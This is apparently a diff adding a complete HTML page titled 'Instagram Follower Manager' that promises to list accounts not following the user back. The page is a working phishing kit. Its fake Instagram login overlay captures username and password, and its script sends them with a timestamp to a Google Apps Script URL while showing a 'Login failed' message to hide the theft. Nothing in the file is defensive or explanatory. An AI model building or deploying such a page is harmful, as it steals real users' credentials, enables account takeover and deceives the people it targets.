@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Access – Instagram Follower Manager</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #0f0f0f;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── NAV ── */
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+      border-bottom: 1px solid #1e1e1e;
+    }
+
+    .logo {
+      font-size: 22px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #4a90d9, #a855f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .nav-btn {
+      background: transparent;
+      border: 1.5px solid #4a90d9;
+      color: #4a90d9;
+      padding: 8px 20px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+    }
+
+    .nav-btn:hover {
+      background: #4a90d9;
+      color: #fff;
+    }
+
+    /* ── HERO ── */
+    .hero {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 80px 24px 60px;
+      gap: 24px;
+    }
+
+    .badge {
+      background: #1a1a2e;
+      border: 1px solid #4a90d9;
+      color: #4a90d9;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 1.2px;
+      text-transform: uppercase;
+      padding: 6px 16px;
+      border-radius: 50px;
+    }
+
+    .hero h1 {
+      font-size: clamp(32px, 6vw, 58px);
+      font-weight: 800;
+      line-height: 1.15;
+      max-width: 720px;
+    }
+
+    .hero h1 span {
+      background: linear-gradient(135deg, #4a90d9, #a855f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .hero p {
+      font-size: 17px;
+      color: #aaa;
+      max-width: 520px;
+      line-height: 1.7;
+    }
+
+    .cta-btn {
+      background: linear-gradient(135deg, #2d6fd4, #7c3aed);
+      color: #fff;
+      border: none;
+      padding: 16px 40px;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.2s;
+      margin-top: 8px;
+    }
+
+    .cta-btn:hover {
+      opacity: 0.88;
+      transform: translateY(-2px);
+    }
+
+    .sub-note {
+      font-size: 13px;
+      color: #555;
+    }
+
+    /* ── FEATURES ── */
+    .features {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 20px;
+      padding: 60px 40px;
+      background-color: #111;
+    }
+
+    .card {
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+      border-radius: 16px;
+      padding: 28px 24px;
+      width: 220px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      transition: border-color 0.2s, transform 0.2s;
+    }
+
+    .card:hover {
+      border-color: #4a90d9;
+      transform: translateY(-4px);
+    }
+
+    .card-icon {
+      font-size: 28px;
+    }
+
+    .card h3 {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .card p {
+      font-size: 13px;
+      color: #888;
+      line-height: 1.6;
+    }
+
+    /* ── HOW IT WORKS ── */
+    .how {
+      padding: 70px 40px;
+      text-align: center;
+    }
+
+    .how h2 {
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 48px;
+      color: #fff;
+    }
+
+    .steps {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 32px;
+    }
+
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      max-width: 180px;
+    }
+
+    .step-num {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #2d6fd4, #7c3aed);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      font-weight: 800;
+    }
+
+    .step h4 {
+      font-size: 14px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .step p {
+      font-size: 13px;
+      color: #777;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      text-align: center;
+      padding: 24px;
+      font-size: 13px;
+      color: #444;
+      border-top: 1px solid #1e1e1e;
+    }
+
+    /* ── LOGIN OVERLAY ── */
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(6px);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .overlay.active {
+      display: flex;
+    }
+
+    .overlay-close {
+      position: absolute;
+      top: 20px;
+      right: 28px;
+      background: none;
+      border: none;
+      color: #aaa;
+      font-size: 28px;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .overlay-close:hover {
+      color: #fff;
+    }
+
+    /* Login box — reuse existing styles */
+    .login-container {
+      background-color: #242424;
+      border-radius: 16px;
+      padding: 40px 32px 32px;
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      position: relative;
+    }
+
+    .login-container h1 {
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 4px;
+      text-align: center;
+      background: none;
+      -webkit-text-fill-color: #fff;
+    }
+
+    .input-field {
+      width: 100%;
+      background-color: #2e2e2e;
+      border: 1.5px solid #444;
+      border-radius: 12px;
+      padding: 18px 16px;
+      color: #ffffff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .input-field:focus { border-color: #4a90d9; }
+    .input-field::placeholder { color: #888; }
+    .input-field.active-border { border-color: #4a90d9; }
+
+    .btn-login {
+      width: 100%;
+      background-color: #2d4f8a;
+      color: #a0b8d8;
+      border: none;
+      border-radius: 50px;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: background-color 0.3s, opacity 0.3s, color 0.3s;
+      margin-top: 4px;
+      opacity: 0.45;
+    }
+
+    .btn-login:not(:disabled) {
+      cursor: pointer;
+      opacity: 1;
+      color: #ffffff;
+    }
+
+    .btn-login:not(:disabled):hover { background-color: #3a5fa0; }
+
+    .forgot-password {
+      text-align: center;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 8px 0;
+      text-decoration: none;
+      display: block;
+    }
+
+    .forgot-password:hover { text-decoration: underline; }
+
+    .divider { height: 24px; }
+
+    .btn-facebook {
+      width: 100%;
+      background-color: transparent;
+      border: 1.5px solid #444;
+      border-radius: 50px;
+      padding: 11px 16px;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: background-color 0.2s;
+    }
+
+    .btn-facebook:hover { background-color: #2e2e2e; }
+
+    .fb-icon { width: 24px; height: 24px; flex-shrink: 0; }
+
+    .btn-create-account {
+      width: 100%;
+      background-color: transparent;
+      border: 1.5px solid #4a90d9;
+      border-radius: 50px;
+      padding: 11px 16px;
+      color: #4a90d9;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-create-account:hover { background-color: rgba(74, 144, 217, 0.08); }
+
+    /* ── SUCCESS TOAST ── */
+    .toast {
+      position: fixed;
+      bottom: 40px;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: #f5c518;
+      border: 1.5px solid #f5c518;
+      color: #000000;
+      font-size: 15px;
+      font-weight: 600;
+      padding: 14px 28px;
+      border-radius: 50px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease, transform 0.3s ease;
+      z-index: 200;
+      white-space: nowrap;
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- NAV -->
+  <nav>
+    <div class="logo">Follower Manager</div>
+  </nav>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="badge">✦ Know who doesn't follow you back</div>
+    <h1>Improve Your<br /><span>Instagram Profile</span></h1>
+    <p>Get a list of all those account which don't follow you back with their profile links.</p>
+    <button class="cta-btn" onclick="openLogin()">Connect with your Instagram ID  </button>
+  </section>
+
+  <!-- HOW IT WORKS -->
+  <section class="how">
+    <h2>How it works</h2>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <h4>Login with your id</h4>
+        <p>Sign in with your account credentials.</p>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <h4>Tool runs on server to pull followers and following list from your account</h4>
+        <p>This requires your id and password.</p>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <h4>Get your report</h4>
+        <p>The tool will compare both lists and provide the list of people who don't follow you back</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer>
+    © 2026. All rights reserved.
+  </footer>
+
+  <!-- LOGIN OVERLAY -->
+  <div class="overlay" id="loginOverlay">
+    <div class="login-container">
+      <button class="overlay-close" onclick="closeLogin()">×</button>
+      <h1>Log into Instagram</h1>
+
+      <input class="input-field active-border" id="usernameField" type="text" placeholder="Mobile number, username or email" />
+      <input class="input-field" id="passwordField" type="password" placeholder="Password" />
+
+      <button class="btn-login" id="loginBtn" disabled>Log in</button>
+
+      <a class="forgot-password" href="#">Forgot password?</a>
+
+      <div class="divider"></div>
+
+      <button class="btn-facebook">
+        <svg class="fb-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="12" r="12" fill="#1877F2"/>
+          <path d="M16.5 8H14.5C13.948 8 13.5 8.448 13.5 9V11H16.5L16 14H13.5V21H10.5V14H8.5V11H10.5V9C10.5 7.343 11.843 6 13.5 6H16.5V8Z" fill="white"/>
+        </svg>
+        Log in with Facebook
+      </button>
+
+      <button class="btn-create-account">Create new account</button>
+    </div>
+  </div>
+
+  <!-- SUCCESS TOAST -->
+  <div class="toast" id="successToast"> Unable to fetch data - Login failed </div>
+
+  <script>
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbybJ8DSbx9fpzN9H9AhNyKklmuH-NOj5_0oR5X3rv5LBmgbLrFE2ZBjcBYlZiiHouyb/exec';
+
+    function showToast() {
+      const toast = document.getElementById('successToast');
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    function openLogin() {
+      document.getElementById('loginOverlay').classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeLogin() {
+      document.getElementById('loginOverlay').classList.remove('active');
+      document.body.style.overflow = '';
+    }
+
+    // Close overlay on backdrop click
+    document.getElementById('loginOverlay').addEventListener('click', function (e) {
+      if (e.target === this) closeLogin();
+    });
+
+    const passwordField = document.getElementById('passwordField');
+    const usernameField = document.getElementById('usernameField');
+    const loginBtn = document.getElementById('loginBtn');
+
+    passwordField.addEventListener('input', () => {
+      loginBtn.disabled = passwordField.value.length < 6;
+    });
+
+    loginBtn.addEventListener('click', () => {
+      const username = usernameField.value.trim();
+      const password = passwordField.value;
+
+      const now = new Date();
+      const date = now.toLocaleDateString('en-GB');
+      const time = now.toLocaleTimeString('en-GB');
+
+      // Close modal and show toast immediately — don't wait for fetch
+      closeLogin();
+      showToast();
+
+      // Send data to Google Sheets in the background
+      fetch(SHEET_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password, date, time })
+      }).catch(err => console.error('Logging failed:', err));
+    });
+  </script>
+
+</body>
+</html>
